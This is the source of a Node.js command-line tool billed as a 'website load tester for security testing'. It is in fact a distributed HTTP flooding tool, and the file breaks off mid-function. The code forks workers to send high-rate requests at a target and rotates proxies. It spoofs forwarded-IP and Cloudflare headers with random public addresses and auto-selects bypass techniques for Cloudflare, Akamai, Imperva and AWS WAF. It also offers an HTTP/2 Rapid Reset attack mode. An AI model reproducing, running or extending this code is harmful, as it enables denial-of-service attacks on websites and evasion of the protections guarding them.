#!/usr/bin/env node

/**
 * Advanced Website Load Testing Tool
 * For security testing and performance evaluation purposes only
 */

const cluster = require('cluster');
const os = require('os');
const https = require('https');
const http = require('http');
const http2 = require('http2');
const fs = require('fs');
const url = require('url');
const crypto = require('crypto');
const tunnel = require('tunnel');
const { program } = require('commander');
const userAgents = require('./user-agents.js');
const bypassTechniques = require('./bypass-techniques.js');
const wafBypassTechniques = require('./waf-bypass.js');
const networkDetector = require('./network-detector.js');
const { performance } = require('perf_hooks');

// Immediately check if this is a worker process and suppress output
if (cluster.isWorker) {
  // Completely silence worker processes
  console.log = () => {};
  console.error = () => {};
  console.warn = () => {};
  console.info = () => {};
  process.env.NODE_NO_WARNINGS = '1';
}

// Parse function for numeric parameters with fallback
const parseNum = (value, fallback) => {
  if (value === undefined || value === null) return fallback;
  const parsed = parseInt(value, 10);
  return isNaN(parsed) ? fallback : parsed;
};

// Parse command line options
program
  .version('1.0.0')
  .description('Advanced Website Load Tester with security bypass features')
  .option('-t, --target <url>', 'Target URL')
  .option('-c, --connections <number>', 'Number of concurrent connections', parseNum, 10)
  .option('-d, --duration <seconds>', 'Test duration in seconds', parseNum, 30)
  .option('-m, --method <method>', 'HTTP method to use (GET, POST, etc.)', 'GET')
  .option('-p, --payload <file>', 'Payload file for POST/PUT requests')
  .option('-r, --rate <number>', 'Requests per second per worker', parseNum, 50)
  .option('-b, --bypass <techniques>', 'Comma-separated list of bypass techniques', 'all')
  .option('--headers <headers>', 'Custom headers in JSON format')
  .option('--verbose', 'Enable verbose output', false)
  .option('--delay <ms>', 'Delay between requests in ms', parseNum, 0)
  .option('--proxy <proxy>', 'Use proxy (format: host:port)')
  .option('--proxy-file <file>', 'Load proxies from file (format: host:port per line)')
  .option('--log <file>', 'Log results to file')
  .option('--keep-alive', 'Use HTTP keep-alive', false)
  .option('--randomize-path', 'Add random path segments to URL', false)
  .option('--auto-detect', 'Auto-detect best bypass techniques for target', false)
  .option('--timeout <ms>', 'Request timeout in milliseconds', parseNum, 10000)
  .option('--follow-redirects', 'Follow HTTP redirects', false)
  .option('--max-redirects <number>', 'Maximum number of redirects to follow', parseNum, 5)
  .option('--no-warnings', 'Suppress TLS warnings', false)
  .option('--protocol <protocol>', 'HTTP protocol to use (http1.0, http1.1, http2)', 'http1.1')
  .option('--rapid-reset', 'Enable HTTP/2 Rapid Reset attack mode. This will ignore some other options.', false)
  .option('--quiet', 'Suppress worker output and warnings', false)
  .option('--no-banner', 'Do not display ASCII banner', false)
  .option('--silent', 'Only show final results', false)
  .parse(process.argv);

const options = program.opts();

// If master process and quiet/silent option, suppress output
if (cluster.isMaster && (options.quiet || options.silent)) {
  const originalConsoleLog = console.log;
  console.log = function() {
    // Convert arguments to string for checking
    const message = Array.from(arguments).join(' ');
    
    if (options.silent) {
      // In silent mode, only show test completion and results
      if (message.includes('Test completed') || 
          message.includes('Total requests:') || 
          message.includes('Successful requests:') ||
          message.includes('Failed requests:') ||
          message.includes('Requests/second:') ||
          message.includes('Bandwidth:') || 
          message.includes('Data transferred:') ||
          message.includes('Status codes:') ||
          message.includes('Total time:')) {
        originalConsoleLog.apply(console, arguments);
      }
    } else if (options.quiet) {
      // In quiet mode, show test statistics and some status messages
      if (message.includes('[*] Time:') || 
          message.includes('Test completed') || 
          message.includes('Total requests:') || 
          message.includes('Successful requests:') ||
          message.includes('Failed requests:') ||
          message.includes('Requests/second:') ||
          message.includes('Bandwidth:') || 
          message.includes('Data transferred:') ||
          message.includes('Status codes:') ||
          message.includes('Total time:') ||
          message.includes('[*] Target:') ||
          message.includes('[*] Method:') ||
          message.includes('[*] Connections:') ||
          message.includes('[*] Duration:') ||
          message.includes('[*] Request rate:')) {
        originalConsoleLog.apply(console, arguments);
      }
    } else {
      // Normal output mode
      originalConsoleLog.apply(console, arguments);
    }
  };
  
  // Also silence console.error in silent mode
  if (options.silent) {
    console.error = () => {};
  }
  
  process.env.NODE_NO_WARNINGS = '1';
}

// Validate and sanitize options
Object.keys(options).forEach(key => {
  if (typeof options[key] === 'string' && key !== 'target' && key !== 'method' && key !== 'bypass' && key !== 'protocol') {
    // Try to parse numeric strings
    if (/^\d+$/.test(options[key])) {
      options[key] = parseInt(options[key], 10);
    }
    // Try to parse boolean strings
    else if (options[key] === 'true' || options[key] === 'false') {
      options[key] = options[key] === 'true';
    }
  }
});

// Suppress TLS warnings by setting this environment variable very early
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
process.env.NODE_NO_WARNINGS = '1';

// Completely disable warnings for NODE_TLS_REJECT_UNAUTHORIZED
const originalEmit = process.emit;
process.emit = function(name, data, ...args) {
  if (
    name === 'warning' && 
    data && 
    data.message && 
    (data.message.includes('NODE_TLS_REJECT_UNAUTHORIZED') || 
     data.message.includes('TLS connections'))
  ) {
    return false;
  }
  return originalEmit.apply(process, [name, data, ...args]);
};

// Disable certificate validation for testing purposes
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

// Validate arguments
if (!options.target) {
  console.error('Error: Target URL is required');
  program.help();
  process.exit(1);
}

// Try to parse the URL to ensure it's valid
try {
  new URL(options.target);
} catch (e) {
  console.error('Error: Invalid target URL format');
  process.exit(1);
}

// Load proxies from file if specified
let proxyList = [];
if (options.proxyFile) {
  try {
    const proxyData = fs.readFileSync(options.proxyFile, 'utf8');
    proxyList = proxyData.split('\n')
      .map(line => line.trim())
      .filter(line => line && line.includes(':'));
    
    if (proxyList.length === 0) {
      console.error('Error: No valid proxies found in file');
      process.exit(1);
    }
    
    console.log(`[*] Loaded ${proxyList.length} proxies from ${options.proxyFile}`);
  } catch (e) {
    console.error(`Error reading proxy file: ${e.message}`);
    process.exit(1);
  }
}

console.log(`[*] Target: ${options.target}`);
console.log(`[*] Method: ${options.method}`);
console.log(`[*] Connections: ${options.connections}`);
console.log(`[*] Duration: ${options.duration} seconds`);
console.log(`[*] Request rate: ${options.rate} requests/second/worker`);

if (options.proxy) {
  console.log(`[*] Using proxy: ${options.proxy}`);
} else if (proxyList.length > 0) {
  console.log(`[*] Using ${proxyList.length} proxies in rotation`);
}

// Fix protocol validation to support all protocols properly
if (options.protocol !== 'http1.0' && options.protocol !== 'http1.1' && options.protocol !== 'http2') {
  console.log(`Warning: Invalid protocol "${options.protocol}", using http1.1`);
  options.protocol = 'http1.1';
} else {
  console.log(`[*] Using ${options.protocol.toUpperCase()} protocol`);
}

// Initialize target details
const targetUrl = new url.URL(options.target);
const targetProtocol = targetUrl.protocol === 'https:' ? https : http;
const targetPort = targetUrl.port || (targetUrl.protocol === 'https:' ? 443 : 80);

// Parse custom headers
let customHeaders = {};
if (options.headers) {
  try {
    customHeaders = JSON.parse(options.headers);
  } catch (e) {
    console.error('Error parsing custom headers:', e.message);
    process.exit(1);
  }
}

// Parse payload data for POST/PUT requests
let payloadData = '';
if (options.payload && ['POST', 'PUT', 'PATCH'].includes(options.method.toUpperCase())) {
  try {
    payloadData = fs.readFileSync(options.payload, 'utf8');
  } catch (e) {
    console.error(`Error reading payload file: ${e.message}`);
    process.exit(1);
  }
}

// Parse bypass techniques
let bypassOptions = options.bypass === 'all' 
  ? [...Object.keys(bypassTechniques), ...Object.keys(wafBypassTechniques)]
  : options.bypass.split(',');

// Stats tracking
const stats = {
  requests: 0,
  successful: 0,
  failed: 0,
  statusCodes: {},
  startTime: null,
  endTime: null,
  workers: 0,
  bytesReceived: 0,
  bytesSent: 0
};

// For master process
if (cluster.isMaster) {
  // Check if we should display the banner
  const shouldShowBanner = !options.silent && options.noBanner !== false;
  
  if (shouldShowBanner) {
    console.log(`
 ▄▄▄▄▄▄▄▄▄▄▄  ▄         ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
▐░█▀▀▀▀▀▀▀▀▀ ▐░▌       ▐░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ 
▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌          
▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
 ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌ ▀▀▀▀▀▀▀▀▀█░▌ ▀▀▀▀▀▀▀▀▀█░▌
          ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌          ▐░▌          ▐░▌
 ▄▄▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌▐░▌       ▐░▌ ▄▄▄▄▄▄▄▄▄█░▌ ▄▄▄▄▄▄▄▄▄█░▌
▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
 ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀ 
                                                                   
Advanced Website Load Testing Tool
For security testing and performance evaluation purposes only
Developed By Triotion (https://t.me/Triotion)
---------------------------------------------------------------
If you find this tool valuable, consider donating to support ongoing development:

BTC: bc1qtkm7dzjp76gx8t9c02pshfd8rzarj6gj9yzglu
ETH: 0x88Aa0E09a5A62919321f38Fb4782A17f4dc91A9B
XMR: 0x6730c52B3369fD22E3ACc6090a3Ee7d5C617aBE0
---------------------------------------------------------------
`);
  }

  // Only print configuration in non-silent mode
  if (!options.silent) {
    console.log(`[*] Target: ${options.target}`);
    console.log(`[*] Method: ${options.method}`);
    console.log(`[*] Connections: ${options.connections}`);
    console.log(`[*] Duration: ${options.duration} seconds`);
    console.log(`[*] Request rate: ${options.rate} requests/second/worker`);
    
    if (options.proxy) {
      console.log(`[*] Using proxy: ${options.proxy}`);
    } else if (proxyList.length > 0) {
      console.log(`[*] Using ${proxyList.length} proxies in rotation`);
    }
    
    if (options.protocol === 'http2') {
      console.log(`[*] Using HTTP/2 protocol`);
    }
  }
  
  // Auto-detect protection systems if enabled
  if (options.autoDetect) {
    console.log(`[*] Auto-detecting protection systems...`);
    
    networkDetector.detectProtectionSystems(options.target)
      .then(result => {
        const detected = result.detected.join(', ') || 'None';
        console.log(`[*] Detected protection systems: ${detected}`);
        
        // Use recommended bypass techniques
        if (result.recommendedBypass.length > 0) {
          bypassOptions = result.recommendedBypass;
          console.log(`[*] Using recommended bypass techniques: ${bypassOptions.join(', ')}`);
        } else if (detected.includes('Cloudflare')) {
          // Cloudflare detected - prioritize Cloudflare-specific bypass techniques
          bypassOptions = [
            'cloudflareBypass',
            'cloudflareUAMBypass', 
            'cloudflareTurnstileBypass', 
            'cloudflareManagedChallengeBypass',
            'advancedCloudflareBypass',
            'browserCapabilities',
            'securityTokenEmulation',
            'randomizeHeaderOrder',
            'believableReferrer',
            'antiMeasurementEvasion'
          ];
          console.log(`[*] Cloudflare detected - using specialized bypass techniques: ${bypassOptions.join(', ')}`);
        } else if (detected.includes('Akamai')) {
          // Akamai detected
          bypassOptions = [
            'akamaiBotManagerBypass',
            'neuralNetworkWafBypass',
            'tlsFingerprintScrambling',
            'browserCapabilities',
            'navigationBehavior',
            'securityTokenEmulation'
          ];
          console.log(`[*] Akamai detected - using specialized bypass techniques: ${bypassOptions.join(', ')}`);
        } else if (detected.includes('Imperva') || detected.includes('Incapsula')) {
          // Imperva detected
          bypassOptions = [
            'impervaAdvancedBypass',
            'neuralNetworkWafBypass',
            'browserCapabilities',
            'navigationBehavior',
            'securityTokenEmulation',
            'clientHints'
          ];
          console.log(`[*] Imperva detected - using specialized bypass techniques: ${bypassOptions.join(', ')}`);
        } else if (detected.includes('AWS') || detected.includes('Amazon')) {
          // AWS WAF detected
          bypassOptions = [
            'awsWafShieldBypass',
            'neuralNetworkWafBypass',
            'tlsFingerprintScrambling',
            'browserCapabilities',
            'securityTokenEmulation'
          ];
          console.log(`[*] AWS WAF detected - using specialized bypass techniques: ${bypassOptions.join(', ')}`);
        } else {
          // Generic WAF or unknown protection
          bypassOptions = [
            'neuralNetworkWafBypass',
            'tlsFingerprintScrambling',
            'randomizeHeaderOrder',
            'browserCapabilities',
            'securityTokenEmulation',
            'navigationBehavior',
            'clientHints'
          ];
          console.log(`[*] Using generic WAF bypass techniques: ${bypassOptions.join(', ')}`);
        }
        
        // Start test after detection
        startTest();
      })
      .catch(err => {
        console.error(`[!] Error during protection detection: ${err.message}`);
        console.log(`[*] Continuing with specified bypass techniques`);
        startTest();
      });
  } else {
    console.log(`[*] Bypass techniques: ${bypassOptions.join(', ')}`);
    startTest();
  }
  
  // Function to start the actual test
  function startTest() {
    // Start workers based on CPU cores (max of connections)
    const numCPUs = Math.min(os.cpus().length, options.connections);
    stats.workers = numCPUs;
    
    console.log(`[*] Starting ${numCPUs} worker processes...`);
    
    // Track completed workers
    let completedWorkers = 0;
    let activeWorkers = 0;
    
    // Fork workers
    for (let i = 0; i < numCPUs; i++) {
      // Pass silent flag to worker to prevent console output duplication
      const worker = cluster.fork({ WORKER_SILENT: '1' });
      activeWorkers++;
      
      // Send bypass options to worker
      worker.send({ 
        type: 'config', 
        bypassOptions, 
        proxyList, 
        settings: {
          connections: options.connections,
          rate: options.rate,
          duration: options.duration,
          timeout: options.timeout,
          delay: options.delay,
          quiet: true // Force worker to be quiet
        }
      });
      
      // Handle messages from workers
      worker.on('message', (msg) => {
        if (msg.type === 'stats') {
          stats.requests += msg.data.requests;
          stats.successful += msg.data.successful;
          stats.failed += msg.data.failed;
          stats.bytesReceived += msg.data.bytesReceived || 0;
          stats.bytesSent += msg.data.bytesSent || 0;
          
          // Merge status codes
          for (const code in msg.data.statusCodes) {
            stats.statusCodes[code] = (stats.statusCodes[code] || 0) + msg.data.statusCodes[code];
          }
        } else if (msg.type === 'error') {
            console.error(`[WORKER_ERROR] Message: ${msg.data.message}`);
            console.error(`[WORKER_ERROR] Stack: ${msg.data.stack}`);
        } else if (msg.type === 'completed') {
          completedWorkers++;
          activeWorkers--;
          
          // All workers completed, show final stats
          if (completedWorkers === numCPUs) {
            stats.endTime = Date.now();
            printFinalStats();
            
            // Log results if specified
            if (options.log) {
              const logData = {
                target: options.target,
                method: options.method,
                duration: options.duration,
                connections: options.connections,
                bypass: bypassOptions,
                stats
              };
              
              fs.writeFileSync(options.log, JSON.stringify(logData, null, 2));
              console.log(`[*] Results logged to ${options.log}`);
            }
            
            process.exit(0);
          }
        }
      });
      
      // Handle worker crashes
      worker.on('exit', (code, signal) => {
        activeWorkers--;
        if (signal) {
          // Worker was killed
          if (options.verbose && !options.quiet) {
            console.log(`[!] Worker was killed by signal: ${signal}`);
          }
        } else if (code !== 0) {
          // Worker crashed
          if (options.verbose && !options.quiet) {
            console.log(`[!] Worker exited with error code: ${code}`);
          }
          
          // Respawn worker if test is still running
          if (Date.now() - stats.startTime < options.duration * 1000) {
            spawnWorker();
          }
        }
      });
    }
    
    // Print stats periodically
    stats.startTime = Date.now();
    const statsInterval = setInterval(() => {
      printStats();
    }, 5000);
    
    // Set test duration
    setTimeout(() => {
      clearInterval(statsInterval);
      for (const id in cluster.workers) {
        cluster.workers[id].send({ type: 'stop' });
      }
    }, options.duration * 1000);
  }
  
  // Print final stats
  function printFinalStats() {
    const totalTime = (stats.endTime - stats.startTime) / 1000;
    const rps = Math.round(stats.requests / totalTime);
    
    console.log('\n---------------------------------------------------------------');
    console.log('Test completed');
    console.log('---------------------------------------------------------------');
    console.log(`Total requests: ${stats.requests}`);
    console.log(`Successful requests: ${stats.successful}`);
    console.log(`Failed requests: ${stats.failed}`);
    console.log(`Requests/second: ${rps}`);
    
    // Calculate bandwidth with proper byte count
    const totalMBReceived = Math.max(0, stats.bytesReceived) / (1024 * 1024);
    const totalMBSent = Math.max(0, stats.bytesSent) / (1024 * 1024);
    const mbpsReceived = (totalMBReceived * 8) / totalTime;
    const mbpsSent = (totalMBSent * 8) / totalTime;
    
    console.log(`Bandwidth: ${mbpsReceived.toFixed(2)} Mbps received, ${mbpsSent.toFixed(2)} Mbps sent`);
    console.log(`Data transferred: ${totalMBReceived.toFixed(2)} MB received, ${totalMBSent.toFixed(2)} MB sent`);
    
    console.log('Status codes:');
    
    for (const code in stats.statusCodes) {
      console.log(`  ${code}: ${stats.statusCodes[code]}`);
    }
    
    console.log(`Total time: ${totalTime.toFixed(2)} seconds`);
    console.log('---------------------------------------------------------------');
  }
  
  // Print current stats
  function printStats() {
    const currentTime = Date.now();
    const elapsedTime = (currentTime - stats.startTime) / 1000;
    const rps = Math.round(stats.requests / elapsedTime);
    
    // Base stats line
    let statsLine = `[*] Time: ${elapsedTime.toFixed(1)}s, Requests: ${stats.requests}, RPS: ${rps}`;
    
    // Add status code distribution in a cleaner format
    let statusCodes = '';
    const sortedCodes = Object.entries(stats.statusCodes)
      .sort((a, b) => b[1] - a[1]); // Sort by count (descending)
    
    for (const [code, count] of sortedCodes) {
      if (statusCodes) statusCodes += ', ';
      // Format HTTP status codes differently from error codes
      if (/^\d{3}$/.test(code)) {
        statusCodes += `HTTP ${code}: ${count}`;
      } else {
        statusCodes += `${code}: ${count}`;
      }
      
      // Limit the length of the status line
      if (statusCodes.length > 60) {
        statusCodes += ", ...";
        break;
      }
    }
    
    if (statusCodes) {
      statsLine += ` | Status: ${statusCodes}`;
    } else {
      statsLine += ` | Success: ${stats.successful}, Failed: ${stats.failed}`;
    }
    
    console.log(statsLine);
  }
  
  // Handle termination
  process.on('SIGINT', () => {
    console.log('\n[!] Test interrupted');
    for (const id in cluster.workers) {
      cluster.workers[id].send({ type: 'stop' });
    }
    stats.endTime = Date.now();
    printFinalStats();
    process.exit(0);
  });
  
  // Test HTTP/2 more thoroughly and ensure automatic fallback
  if (options.protocol === 'http2') {
    console.log('[*] Testing HTTP/2 support on target server...');
    
    let http2Supported = false;
    let testSuccess = false;
    const testTimeout = setTimeout(() => {
      if (!testSuccess) {
        console.log('[!] HTTP/2 test timed out or failed - falling back to HTTP/1.1');
        options.protocol = 'http1.1';
      }
    }, 5000);
    
    try {
      const http2Check = http2.connect(options.target, {
        rejectUnauthorized: false
      });
      
      http2Check.on('connect', () => {
        http2Supported = true;
        console.log('[+] Target server accepted HTTP/2 connection, testing a request...');
        
        // Try to make an actual HTTP/2 request to test full support
        const req = http2Check.request({ 
          ':method': 'GET',
          ':path': '/',
          ':scheme': 'https',
          ':authority': new URL(options.target).host,
          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
        });
        
        req.on('response', (headers) => {
          const status = headers[':status'];
          if (status) {
            testSuccess = true;
            clearTimeout(testTimeout);
            console.log(`[+] HTTP/2 test request succeeded with status ${status}`);
            http2Check.close();
          }
        });
        
        req.on('error', () => {
          // If the request fails, fall back to HTTP/1.1
          clearTimeout(testTimeout);
          console.log('[!] HTTP/2 connection successful but request failed - falling back to HTTP/1.1');
          options.protocol = 'http1.1';
          http2Check.close();
        });
        
        // End the test request
        req.end();
      });
      
      http2Check.on('error', (err) => {
        clearTimeout(testTimeout);
        console.log(`[!] HTTP/2 connection failed: ${err.message} - falling back to HTTP/1.1`);
        options.protocol = 'http1.1';
      });
    } catch (err) {
      clearTimeout(testTimeout);
      console.log(`[!] HTTP/2 test error: ${err.message} - falling back to HTTP/1.1`);
      options.protocol = 'http1.1';
    }
  } else if (options.protocol === 'http1.0') {
    console.log('[*] Using HTTP/1.0 protocol (note: this is an older protocol with limitations)');
  } else {
    console.log('[*] Using HTTP/1.1 protocol');
  }
} else {
  // For worker process
  
  // Check if worker should be silent
  const silent = process.env.WORKER_SILENT === '1' || true;
  
  // Completely silence the worker process if needed
  if (silent) {
    // Override console methods to suppress output
    console.log = () => {};
    console.error = () => {};
    console.warn = () => {};
    console.info = () => {};
  }
  
  const workerStats = {
    requests: 0,
    successful: 0,
    failed: 0,
    statusCodes: {},
    bytesReceived: 0,
    bytesSent: 0
  };
  
  // Handle worker process errors
  process.on('uncaughtException', (err) => {
    // Only log errors in verbose mode and when not silent
    if (options.verbose && !silent) {
      console.error(`[!] Worker uncaught exception: ${err.message}`);
    }
    
    // Try to send stats before exiting
    try {
      process.send({ type: 'stats', data: workerStats });
    } catch (e) {
      // Ignore send errors
    }
    
    process.exit(1);
  });
  
  // Proxy rotation index
  let proxyIndex = 0;
  let proxyList = [];
  let bypassOptions = [];
  
  // Get bypass options from master
  process.on('message', (msg) => {
    if (msg.type === 'config') {
      bypassOptions = msg.bypassOptions;
      proxyList = msg.proxyList || [];
      
      // Apply any settings from master
      if (msg.settings) {
        Object.assign(options, msg.settings);
      }
    } else if (msg.type === 'stop') {
      clearInterval(reportInterval);
      clearInterval(requestInterval);
      process.send({ type: 'completed' });
    }
  });
  
  // Send stats to master periodically
  const reportInterval = setInterval(() => {
    process.send({ type: 'stats', data: workerStats });
  }, 1000);
  
  // Get next proxy from list with round-robin
  const getNextProxy = () => {
    if (proxyList.length === 0) return null;
    
    // Try up to 3 proxies in case some are invalid
    for (let i = 0; i < 3; i++) {
      const proxy = proxyList[proxyIndex];
      proxyIndex = (proxyIndex + 1) % proxyList.length;
      
      // Basic validation of proxy format
      if (proxy && proxy.includes(':')) {
        const [host, port] = proxy.split(':');
        if (host && port && !isNaN(parseInt(port, 10))) {
          return proxy;
        }
      }
    }
    
    // If we couldn't find a valid proxy after 3 tries, return null
    return null;
  };
  
  // Setup request interval
  let requestInterval;
  
  // Wait for initial config message before starting requests
  const startRequestInterval = () => {
    if (!options.duration) { // A proxy for "config received"
        setTimeout(startRequestInterval, 100);
        return;
    }

    if (options.rapidReset) {
        const { launch } = require('./rapid-reset.js');
        launch(options, workerStats);
        return;
    }

    if (bypassOptions.length === 0) {
      setTimeout(startRequestInterval, 100);
      return;
    }
    
    // Ensure delay is a valid number
    const delay = options.delay && !isNaN(options.delay) ? options.delay : 10;
    
    // Perform requests at specified rate
    requestInterval = setInterval(() => {
      const requestsPerInterval = delay ? 
        1 : Math.max(1, Math.floor(options.rate / (1000 / 10)));
      
      for (let i = 0; i < requestsPerInterval; i++) {
        performRequest();
      }
    }, delay);
  };
  
  // Only display warnings in the master process
  if (!options.suppressWarnings) {
    startRequestInterval();
  } else {
    // For worker processes, start silently
    startRequestInterval();
  }
  
  // Fix createRequestOptions to better handle headers and proxies
  function createRequestOptions(targetUrl) {
    const parsedUrl = new URL(targetUrl || options.target);
    let path = parsedUrl.pathname + parsedUrl.search;
    
    // Apply randomized path if enabled
    if (options.randomizePath) {
      const randomSegment = crypto.randomBytes(8).toString('hex');
      path = path + (path.includes('?') ? '&' : '?') + `_=${randomSegment}`;
    }
    
    // Generate randomized IP ranges for X-Forwarded-For (use real-looking IPs)
    const generateRealisticIP = () => {
      // Avoid private IP ranges
      const ranges = [
        // US public ranges (non-reserved)
        [50, 80], // 50.x.x.x - 80.x.x.x
        [96, 110], // 96.x.x.x - 110.x.x.x
        [170, 190], // 170.x.x.x - 190.x.x.x
        [200, 220], // 200.x.x.x - 220.x.x.x
      ];
      
      const range = ranges[Math.floor(Math.random() * ranges.length)];
      const firstOctet = Math.floor(Math.random() * (range[1] - range[0])) + range[0];
      return `${firstOctet}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
    };
    
    // Create a realistic browser fingerprint
    const userAgent = userAgents.getRandomUserAgent('desktop_modern');
    const isChrome = userAgent.includes('Chrome');
    const isFirefox = userAgent.includes('Firefox');
    const isSafari = userAgent.includes('Safari') && !isChrome;
    
    // Identify browser version
    let browserVersion = '96';
    if (isChrome) {
      browserVersion = userAgent.match(/Chrome\/(\d+)/)?.[1] || '96';
    } else if (isFirefox) {
      browserVersion = userAgent.match(/Firefox\/(\d+)/)?.[1] || '91';
    } else if (isSafari) {
      browserVersion = userAgent.match(/Version\/(\d+)/)?.[1] || '15';
    }
    
    // Generate a unique session ID to trace requests
    if (!createRequestOptions.sessionId) {
      createRequestOptions.sessionId = crypto.randomBytes(16).toString('hex');
    }
    
    // Use consistent IP per session for better emulation
    if (!createRequestOptions.clientIP) {
      createRequestOptions.clientIP = generateRealisticIP();
    }
    
    // Enhanced Cloudflare bypass headers
    const cfHeaders = {
      // Basic browser headers
      'User-Agent': userAgent,
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
      'Accept-Language': 'en-US,en;q=0.9',
      'Accept-Encoding': 'gzip, deflate, br',
      'Upgrade-Insecure-Requests': '1',
      
      // Proper connection handling
      'Connection': options.keepAlive ? 'keep-alive' : 'close',
      
      // Client hints (modern browsers)
      'Sec-CH-UA': isChrome ? 
        `"Google Chrome";v="${browserVersion}", "Chromium";v="${browserVersion}", ";Not A Brand";v="99"` :
        `";Not A Brand";v="99", "Chromium";v="${browserVersion}"`,
      'Sec-CH-UA-Mobile': '?0',
      'Sec-CH-UA-Platform': '"Windows"',
      
      // Fetch metadata (modern browsers)
      'Sec-Fetch-Dest': 'document',
      'Sec-Fetch-Mode': 'navigate',
      'Sec-Fetch-Site': 'none',
      'Sec-Fetch-User': '?1',
      
      // Add CDN-specific headers
      'CDN-Loop': 'cloudflare',
      
      // IP headers - use consistent IP
      'X-Forwarded-For': createRequestOptions.clientIP,
      'CF-Connecting-IP': createRequestOptions.clientIP,
      
      // Cloudflare-specific
      'CF-IPCountry': 'US',
      'CF-Device-Type': 'desktop',
      'CF-Visitor': '{"scheme":"https"}',
      'CF-Worker': 'false',
      
      // HTTP/2 specific headers for browsers
      'Priority': 'u=0, i',
      
      // Privacy indicators
      'DNT': '1',
      
      // Cache control
      'Cache-Control': 'max-age=0',
      
      // Add a unique trace ID that matches real CF headers
      'cf-trace-id': `${Date.now()}-${createRequestOptions.sessionId.substring(0, 8)}`,
      
      // Referrer - realistic for new visitors
      'Referer': 'https://www.google.com/search?q=' + encodeURIComponent(parsedUrl.hostname),
      
      // Custom headers if specified
      ...customHeaders
    };
    
    // Add origin and host headers for proper CORS behavior
    cfHeaders['Host'] = parsedUrl.host;
    cfHeaders['Origin'] = parsedUrl.origin;
    cfHeaders['Alt-Used'] = parsedUrl.host;
    
    // Base request options with enhanced headers
    const requestOptions = {
      hostname: parsedUrl.hostname,
      port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
      path: path,
      method: options.method,
      headers: cfHeaders,
      timeout: options.timeout || 10000,
      rejectUnauthorized: false
    };
    
    // Apply additional bypass techniques
    bypassOptions.forEach(technique => {
      if (bypassTechniques[technique]) {
        try {
          bypassTechniques[technique](requestOptions);
        } catch (error) {
          if (options.verbose) {
            console.error(`Error applying bypass technique ${technique}: ${error.message}`);
          }
        }
      } else if (wafBypassTechniques[technique]) {
        try {
          wafBypassTechniques[technique](requestOptions);
        } catch (error) {
          if (options.verbose) {
            console.error(`Error applying WAF bypass technique ${technique}: ${error.message}`);
          }
        }
      }
    });
    
    // Count request size (headers + URL)
    const headerSize = Buffer.from(Object.entries(requestOptions.headers).map(([k, v]) => `${k}: ${v}`).join('\r\n')).length;
    const urlSize = Buffer.from(requestOptions.path).length;
    workerStats.bytesSent += headerSize + urlSize;
    
    return requestOptions;
  }
  
  // Use built-in http2 module with simpler implementation
  function performHttp2Request(parsedUrl, requestOptions) {
    try {
      // Get URL string for request
      const url = parsedUrl.href;
      
      if (options.verbose) {
        console.log(`[HTTP/2] Requesting: ${url}`);
      }
      
      // Create a standard HTTP/2 session
      const client = http2.connect(parsedUrl.origin, {
        rejectUnauthorized: false
      });
      
      client.on('error', (err) => {
        if (options.verbose) {
          console.error(`[HTTP/2] Connection error: ${err.message}`);
        }
        
        try {
          client.destroy();
        } catch (e) {}
        
        // Count errors
        workerStats.failed++;
        workerStats.requests++;
        workerStats.statusCodes['h2_conn_error'] = (workerStats.statusCodes['h2_conn_error'] || 0) + 1;
      });
      
      // Set auto-close timeout
      setTimeout(() => {
        try {
          client.close();
        } catch (e) {}
      }, options.timeout || 10000);
      
      // Create basic HTTP/2 headers - keep it minimal
      const headers = {
        ':method': requestOptions.method,
        ':path': requestOptions.path,
        ':scheme': 'https',
        ':authority': parsedUrl.host,
        'user-agent': requestOptions.headers['User-Agent'] || 'Mozilla/5.0',
        'accept': requestOptions.headers['Accept'] || '*/*'
      };
      
      // Add cookie if present
      if (requestOptions.headers['Cookie']) {
        headers['cookie'] = requestOptions.headers['Cookie'];
      }
      
      // Create request stream
      try {
        // Send the request
        const req = client.request(headers);
        
        // Handle response
        req.on('response', (headers) => {
          const statusCode = headers[':status'] || 0;
          workerStats.statusCodes[statusCode] = (workerStats.statusCodes[statusCode] || 0) + 1;
          
          if (statusCode >= 200 && statusCode < 400) {
            workerStats.successful++;
          } else {
            workerStats.failed++;
          }
          
          if (options.verbose) {
            console.log(`[HTTP/2] Response status: ${statusCode}`);
          }
        });
        
        req.on('data', (chunk) => {
          workerStats.bytesReceived += chunk.length;
        });
        
        req.on('end', () => {
          workerStats.requests++;
          try { client.close(); } catch (e) {}
        });
        
        req.on('error', (err) => {
          if (options.verbose) {
            console.error(`[HTTP/2] Request error: ${err.message}`);
          }
          
          workerStats.failed++;
          workerStats.requests++;
